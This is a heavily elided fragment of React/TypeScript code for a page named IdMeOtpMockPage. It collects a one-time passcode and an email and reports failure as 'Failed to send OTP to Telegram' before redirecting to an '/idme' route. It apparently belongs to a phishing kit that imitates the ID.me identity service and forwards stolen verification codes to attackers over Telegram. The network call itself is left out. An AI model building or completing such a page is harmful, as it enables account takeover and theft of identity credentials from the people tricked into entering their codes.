...
export default function IdMeOtpMockPage() {
  ...
  const handleSubmit = async (e: React.FormEvent) => {
    ...
    try {
      // ✅ Send otp + email (matches route.ts)
      ...
      if (!res.ok || !data?.success) {
        ...
        alert(data?.error || "Failed to send OTP to Telegram. Try again.");
        setLoading(false);
        return;
      }

      router.push("/idme"); // or your success route
    } catch (err) {
      console.error(err);
  ...
  const resend = async () => {
    ...
    try {
      // Optional: call a resend endpoint (below)
